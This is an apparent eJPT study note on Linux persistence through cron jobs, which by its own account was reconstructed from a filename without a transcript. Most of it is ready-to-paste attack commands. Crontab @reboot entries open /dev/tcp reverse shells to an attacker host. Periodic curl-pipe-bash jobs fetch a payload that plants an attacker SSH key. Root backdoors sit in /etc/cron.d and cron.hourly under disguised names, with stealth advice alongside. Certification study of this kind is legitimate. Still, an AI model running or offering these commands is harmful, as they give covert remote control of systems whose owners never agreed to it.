# 04 - Persistence Via Cron Jobs (02-LinuxPersistence)

Note: No transcript provided. The content below is inferred conservatively from the filename/context and standard Linux persistence techniques using cron, tailored for eJPT study.

## What the video covers (Introduction / big picture)
- Using cron to achieve Linux persistence after initial access.
- Differences between user crontabs and system-wide cron.
- Common persistence patterns: @reboot jobs, periodic reverse shells, dropper scripts, and SSH key reinstatement.
- Enumeration, deployment, verification, stealth, and cleanup.
- Distro nuances (Debian/Ubuntu vs RHEL/CentOS): service names, log locations, and cron directory behavior.

## Flow (ordered)
1. Identify your current privileges and target persistence scope (user vs root).
2. Verify the cron service is running and locate logs.
3. Enumerate existing cron jobs (user, system, directories).
4. Choose a persistence method:
   - User crontab @reboot or every-minute test.
   - System crontab (/etc/crontab, /etc/cron.d/*) if root.
   - Drop executable script in cron.hourly/daily/weekly (run-parts constraints).
5. Add the cron job with absolute paths and minimal/no output.
6. Test execution and watch logs.
7. Make it stealthier (names, timing, output suppression).
8. Document and prepare cleanup procedures.

## Tools highlighted
- crontab (crontab -l/-e/-r/-u, stdin with crontab -)
- systemctl/service (cron/crond)
- journalctl, tail/grep (log monitoring)
- tee, printf, cat (non-interactive file edits)
- curl/wget, bash/sh (payload fetch/exec)
- nc/ncat (listener for reverse shells)
- find/grep/ls/stat (permissions and enumeration)
- pspy/ps (optional, watch processes without root)
- run-parts (understanding cron.* directories behavior)

## Typical command walkthrough (detailed, copy-paste friendly)

Preparation: set attacker IP/port, start listener
```
export LHOST=ATTACKER_IP
export LPORT=4444
# Listener (choose one)
rlwrap nc -lvnp $LPORT
# or
ncat -lvnp $LPORT
```

1) Check cron service and logs (Debian/Ubuntu vs RHEL/CentOS)
```
# Service status
systemctl status cron 2>/dev/null || systemctl status crond 2>/dev/null

# Start/enable if needed
sudo systemctl enable --now cron 2>/dev/null || sudo systemctl enable --now crond 2>/dev/null

# Log locations
# Debian/Ubuntu:
sudo tail -f /var/log/syslog | grep -i CRON
# RHEL/CentOS:
sudo tail -f /var/log/cron
```

2) Enumerate cron
```
# Current user crontab
crontab -l 2>/dev/null || echo "No user crontab"

# If root, enumerate all key locations
sudo ls -l /etc/crontab /etc/cron.d 2>/dev/null
sudo ls -l /etc/cron.{hourly,daily,weekly,monthly} 2>/dev/null
# Debian user crontabs:
sudo ls -l /var/spool/cron/crontabs 2>/dev/null
# RHEL user crontabs:
sudo ls -l /var/spool/cron 2>/dev/null

# Quick grep for suspicious/interesting entries
sudo grep -R --line-number --no-color -iE '(curl|wget|bash|nc|ncat|python|@reboot)' /etc/cron* 2>/dev/null
```

3) Quick test job in your user crontab (every minute)
```
# Create a harmless test marker to confirm cron runs, and log uid
( crontab -l 2>/dev/null; \
  echo 'SHELL=/bin/bash'; \
  echo 'PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin'; \
  echo '* * * * * /bin/bash -c "/usr/bin/id >> /tmp/cron_test.log 2>&1; /usr/bin/touch /tmp/cron_test_marker" >/dev/null 2>&1' \
) | crontab -

# Verify after 1-2 minutes
ls -l /tmp/cron_test_marker
tail -n 5 /tmp/cron_test.log
```

4) User-level persistence with @reboot reverse shell (stealthier timing)
```
( crontab -l 2>/dev/null; \
  echo 'SHELL=/bin/bash'; \
  echo 'PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin'; \
  echo '@reboot /bin/bash -c "sleep 45; exec 3<>/dev/tcp/'"$LHOST"'/'"$LPORT"'; /bin/sh -i <&3 >&3 2>&3" >/dev/null 2>&1' \
) | crontab -

# Reboot or wait for next restart to validate
```

Alternative: periodic fetch+execute (more reliable across shells)
```
( crontab -l 2>/dev/null; \
  echo 'SHELL=/bin/bash'; \
  echo 'PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin'; \
  echo '*/5 * * * * /usr/bin/curl -fsSL http://'"$LHOST"'/p.sh | /bin/bash >/dev/null 2>&1' \
) | crontab -
```
On attacker box, serve payload:
```
# Simple HTTP server
python3 -m http.server 80

# Example payload p.sh
cat > p.sh << 'EOF'
#!/bin/bash
# Example: maintain SSH key and call back once
mkdir -p /home/$USER/.ssh
echo "ssh-ed25519 AAAA... attacker@host" >> /home/$USER/.ssh/authorized_keys
chmod 700 /home/$USER/.ssh
chmod 600 /home/$USER/.ssh/authorized_keys
# One-time reverse shell
bash -c 'exec 3<>/dev/tcp/LHOST/LPORT; /bin/sh -i <&3 >&3 2>&3' >/dev/null 2>&1
EOF
sed -i "s/LHOST/$LHOST/g; s/LPORT/$LPORT/g" p.sh
```

5) System-wide persistence via /etc/cron.d (root)
```
# Create a root cron.d entry (must be owned by root, not group/world-writable)
sudo bash -c "cat > /etc/cron.d/system-update << 'EOF'
SHELL=/bin/bash
PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin
MAILTO=''
# Every 10 minutes fetch-and-execute
*/10 * * * * root /usr/bin/curl -fsSL http://$LHOST/p.sh | /bin/bash >/dev/null 2>&1
# On reboot after 60s, call back
@reboot root /bin/bash -c 'sleep 60; exec 3<>/dev/tcp/$LHOST/$LPORT; /bin/sh -i <&3 >&3 2>&3' >/dev/null 2>&1
EOF
chmod 644 /etc/cron.d/system-update
chown root:root /etc/cron.d/system-update"

# Verify cron sees it (no restart strictly needed)
sudo grep -n 'system-update' /etc/cron.d/system-update
```

6) System-wide persistence via cron.hourly (run-parts rules)
- run-parts only executes filenames matching [A-Za-z0-9_-]+ (no dots), and scripts must be executable.
```
sudo bash -c 'cat > /etc/cron.hourly/system-update << "EOF"
#!/bin/sh
/usr/bin/curl -fsSL http://'"$LHOST"'/p.sh | /bin/sh >/dev/null 2>&1
EOF
chmod 755 /etc/cron.hourly/system-update
chown root:root /etc/cron.hourly/system-update'
```

7) Troubleshooting and verification
```
# Force a quick test job to validate environment
( crontab -l 2>/dev/null; \
  echo '* * * * * /bin/date >> /tmp/cron_tick.txt' \
) | crontab -

# Logs (Debian/Ubuntu)
sudo tail -f /var/log/syslog | grep -i CRON

# Logs (RHEL/CentOS)
sudo tail -f /var/log/cron

# Confirm PATH/SHELL are set correctly at top of the cron file.
```

8) Cleanup (remove artifacts when done)
```
# User crontab wipe (careful: removes all entries)
crontab -r

# Or remove single-line by rewriting
crontab -l | grep -v 'curl -fsSL http://'"$LHOST"'/p.sh' | crontab -

# System-wide
sudo rm -f /etc/cron.d/system-update
sudo rm -f /etc/cron.hourly/system-update
sudo sed -i '/system-update/d' /etc/crontab
```

Reference: Cron syntax
- User crontab format: m h dom mon dow command
- System crontab (/etc/crontab, /etc/cron.d/*): m h dom mon dow user command
- Special strings: @reboot, @hourly, @daily, @weekly, @monthly, @yearly/@annually

Example:
```
# /etc/crontab
SHELL=/bin/bash
PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin
0 * * * * root /usr/local/bin/backup.sh
```

## Practical tips
- Always use absolute paths in cron commands; cron has a minimal environment.
- Prepend PATH and SHELL at the top of crontab files for reliability.
- Suppress output with >/dev/null 2>&1 to reduce noise and emails (or set MAILTO='' at top).
- For cron.* directories, obey run-parts naming and executable bit; avoid dots in filenames.
- Test with a benign job first (touch/date) before deploying payloads.
- Use @reboot with a small sleep to avoid race conditions at boot.
- Distro differences:
  - Service: cron (Debian/Ubuntu) vs crond (RHEL/CentOS)
  - Logs: /var/log/syslog (grep CRON) vs /var/log/cron
  - User crontab spools: /var/spool/cron/crontabs (Debian) vs /var/spool/cron (RHEL)
- File permissions: /etc/cron.d files must be owned by root and not group/world-writable; otherwise ignored.
- Stealth: name entries like “system-update” or “package-health”; schedule less frequently; off-hour execution.
- If allowed by sudo, crontab -u root -e can add root persistence without editing files directly.
- To watch scheduled executions live without logs, use pspy (no root needed) on assessments.

## Minimal cheat sheet (one-screen flow)
```
# 1) Verify cron
systemctl status cron 2>/dev/null || systemctl status crond 2>/dev/null

# 2) Enumerate
crontab -l 2>/dev/null
sudo ls -l /etc/crontab /etc/cron.d /etc/cron.{hourly,daily,weekly,monthly}

# 3) User-level @reboot persistence
export LHOST=ATTACKER_IP LPORT=4444
( crontab -l 2>/dev/null; echo 'SHELL=/bin/bash'; echo 'PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin'; \
  echo '@reboot /bin/bash -c "sleep 45; exec 3<>/dev/tcp/'"$LHOST"'/'"$LPORT"'; /bin/sh -i <&3 >&3 2>&3" >/dev/null 2>&1' ) | crontab -

# 4) Root-level via /etc/cron.d
sudo bash -c "cat > /etc/cron.d/system-update << 'EOF'
SHELL=/bin/bash
PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin
MAILTO=''
*/10 * * * * root /usr/bin/curl -fsSL http://$LHOST/p.sh | /bin/bash >/dev/null 2>&1
EOF
chmod 644 /etc/cron.d/system-update; chown root:root /etc/cron.d/system-update"

# 5) Logs
# Debian/Ubuntu:
sudo tail -f /var/log/syslog | grep -i CRON
# RHEL/CentOS:
sudo tail -f /var/log/cron

# 6) Cleanup
crontab -r
sudo rm -f /etc/cron.d/system-update
```

## Summary
- Cron is a simple, reliable persistence mechanism on Linux via user crontabs or system-wide cron entries.
- Prefer @reboot for stealth persistence and periodic fetch-and-execute for resilience.
- Always set SHELL and PATH, use absolute paths, and validate via logs.
- Respect distro-specific locations and run-parts rules for cron.* directories.
- Maintain operational security: controlled scheduling, benign naming, suppressed output, and ready cleanup commands.